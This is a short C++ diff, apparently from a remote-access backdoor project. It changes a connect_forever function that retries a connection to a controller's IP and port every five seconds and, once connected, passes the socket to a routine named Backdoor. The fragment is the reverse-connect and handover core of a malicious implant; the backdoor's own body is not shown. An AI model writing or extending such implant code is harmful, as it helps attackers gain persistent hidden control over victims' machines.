@@ -10,7 +10,7 @@ Communication::Communication(char *ip, int port){
 }
 
 
-int Communication::connect_forever(){
+void Communication::connect_forever(){
    
     struct sockaddr_in address;
     int sock = 0;
@@ -44,7 +44,9 @@ int Communication::connect_forever(){
             sleep(5);
             continue;
         } 
-        return sock;
+        this->sock = sock;
+        Backdoor(sock, this, false, this->ip);
+        return;
     }
 }
 
